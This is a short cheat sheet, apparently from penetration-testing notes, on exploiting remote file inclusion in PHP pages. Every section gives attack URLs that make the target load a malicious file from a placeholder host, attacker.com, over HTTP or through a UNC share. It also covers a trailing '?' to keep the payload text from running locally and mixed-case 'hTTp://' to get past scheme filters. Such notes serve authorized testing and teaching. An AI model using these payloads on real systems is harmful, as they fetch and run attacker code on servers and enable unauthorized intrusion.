# Remote file inclusion

## Base patterns

```text
http://example.com/index.php?page=http://attacker.com/malicious.php
http://example.com/index.php?page=\\attacker.com\shared\malicious.php
```

The payload must be stored in a location which is accessible by the remote target (on the same network).
If having created the malicious file as, for example a `.txt` file to prevent it from being executed by the local server, add a `?`

```text
http://example.com/index.php?page=http://attacker.com/malicious.txt?
```

If filtering is used, it is unlikely this is on `.`, `/`, `\\` digits or alphanumeric. Could be filtering on `https://` 
and `http://`, so try:

```text
http://example.com/index.php?page=hTTp://attacker.com/malicious.txt?
```

